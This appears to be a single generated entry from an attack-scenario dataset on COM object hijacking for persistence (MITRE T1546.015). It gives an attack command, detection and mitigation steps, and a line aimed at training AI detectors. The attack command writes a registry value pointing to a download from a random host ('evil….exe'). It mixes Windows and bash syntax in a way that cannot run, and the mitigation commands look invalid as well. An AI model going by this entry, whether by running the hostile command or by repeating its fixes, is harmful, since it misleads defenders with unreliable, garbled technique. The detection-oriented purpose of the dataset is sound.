---
type: campaign
scenario_id: 234
tactic: Persistence
technique: "T1546.015: Component Object Model Hijacking"
technique_id: T1546.015
tags: [campaign, lotl, persistence]
---

# Hijacking COM object remotely for persistence.

## Threat Description
Hijacking COM object remotely for persistence.

## Attack Command
```
reg add HKCU\Software\Classes\CLSID\{$(uuidgen)} /v AppID /t REG_SZ /d "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor COM hijacking: `reg query HKCU\Software\Classes\CLSID | findstr http`; Event ID 4657.

## Mitigation
Restrict COM writes: `regini -h deny HKCU\Software\Classes\CLSID`; Block COM downloads: `netsh advfirewall firewall add rule name='Block COM' dir=out action=block protocol=HTTP`.

## AI Training Prompt
Train AI to detect remote COM hijacking and suggest firewall rules.

## References
- MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
